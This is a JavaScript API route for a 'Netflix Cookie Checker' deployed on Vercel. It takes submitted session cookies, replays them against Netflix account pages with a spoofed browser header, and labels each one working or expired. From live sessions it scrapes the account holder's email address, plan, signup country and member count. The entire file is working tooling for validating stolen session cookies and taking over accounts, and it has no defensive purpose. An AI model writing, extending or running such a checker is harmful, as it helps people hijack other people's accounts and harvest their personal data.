/**
 * Netflix Cookie Checker — API Route
 * POST /api/check
 *
 * Accepts cookies, validates them against Netflix,
 * and returns account details.
 */

export const maxDuration = 60; // Vercel Pro: 60s, Free: 10s

export async function POST(request) {
  try {
    const body = await request.json();
    const { cookies } = body;

    if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
      return Response.json(
        { error: "No cookies provided. Send a JSON body with a 'cookies' array." },
        { status: 400 }
      );
    }

    // Build the cookie header string
    const cookieHeader = cookies
      .map((c) => `${c.name}=${c.value}`)
      .join("; ");

    // Make request to Netflix account page
    const result = await checkCookies(cookieHeader);

    return Response.json(result);
  } catch (err) {
    console.error("Check error:", err);
    return Response.json(
      { status: "error", error: err.message || "Internal server error" },
      { status: 500 }
    );
  }
}

/**
 * Check cookies against Netflix by requesting the account page.
 */
async function checkCookies(cookieHeader) {
  const urls = [
    "https://www.netflix.com/YourAccount",
    "https://www.netflix.com/account",
  ];

  for (const url of urls) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 8000);

      const response = await fetch(url, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "identity",
          Cookie: cookieHeader,
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "none",
          "Sec-Fetch-User": "?1",
          "Upgrade-Insecure-Requests": "1",
        },
        redirect: "manual",
        signal: controller.signal,
      });

      clearTimeout(timeout);

      // If we get redirected to login, the cookies are expired
      const location = response.headers.get("location") || "";
      if (
        response.status === 302 ||
        response.status === 301 ||
        location.includes("login") ||
        location.includes("Login")
      ) {
        return { status: "expired", details: null };
      }

      // If we get a 200, try to extract account info
      if (response.status === 200) {
        const html = await response.text();

        // Check if we're actually on the account page (not redirected to a login page in-page)
        if (
          html.includes("login") &&
          !html.includes("membershipType") &&
          !html.includes("localizedPlanName") &&
          !html.includes("emailAddress")
        ) {
          return { status: "expired", details: null };
        }

        const details = extractInfo(html);

        // If we found any account info, the cookie is working
        if (details.email || details.plan) {
          return { status: "working", details };
        }

        // If page loaded but no info extracted, might still be valid
        // Check for common logged-in indicators
        if (
          html.includes("reactContext") ||
          html.includes("profiles") ||
          html.includes("account")
        ) {
          return {
            status: "working",
            details: {
              plan: details.plan || "Unknown",
              email: details.email || "Hidden",
              country: details.country || "Unknown",
              extraMembers: details.extraMembers,
            },
          };
        }

        return { status: "expired", details: null };
      }

      // Other status codes — try next URL
    } catch (err) {
      if (err.name === "AbortError") {
        continue; // timeout, try next URL
      }
      // Network error, try next URL
      continue;
    }
  }

  return { status: "error", error: "Could not reach Netflix", details: null };
}

/**
 * Extract account information from Netflix page HTML.
 * Looks for the reactContext JSON blob inline in the page.
 */
function extractInfo(html) {
  const info = {
    plan: null,
    email: null,
    country: null,
    extraMembers: null,
  };

  try {
    // Extract plan name
    const planMatch = html.match(
      /"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/
    );
    if (planMatch) {
      info.plan = decodeHexEscapes(planMatch[1]);
    }

    // Try alternative plan patterns
    if (!info.plan) {
      const altPlan = html.match(/"planName"\s*:\s*"([^"]+)"/);
      if (altPlan) info.plan = decodeHexEscapes(altPlan[1]);
    }
    if (!info.plan) {
      const altPlan2 = html.match(/"membershipType"\s*:\s*"([^"]+)"/);
      if (altPlan2) info.plan = decodeHexEscapes(altPlan2[1]);
    }

    // Extract email
    const emailMatch = html.match(/"emailAddress"\s*:\s*"([^"]+)"/);
    if (emailMatch) {
      info.email = decodeHexEscapes(emailMatch[1]);
    }

    // Extract country
    const countryMatch = html.match(/"countryOfSignup"\s*:\s*"([^"]+)"/);
    if (countryMatch) {
      info.country = decodeHexEscapes(countryMatch[1]);
    }

    // Extract extra members info
    const extraMatch = html.match(
      /"maxExtraMemberCount"\s*:\s*(\d+)/
    );
    if (extraMatch) {
      info.extraMembers = parseInt(extraMatch[1], 10);
    }
  } catch (err) {
    console.error("Extract error:", err.message);
  }

  return info;
}

/**
 * Decode \xNN and \uNNNN escape sequences.
 */
function decodeHexEscapes(s) {
  if (!s) return s;
  s = s.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
  s = s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
  return s;
}
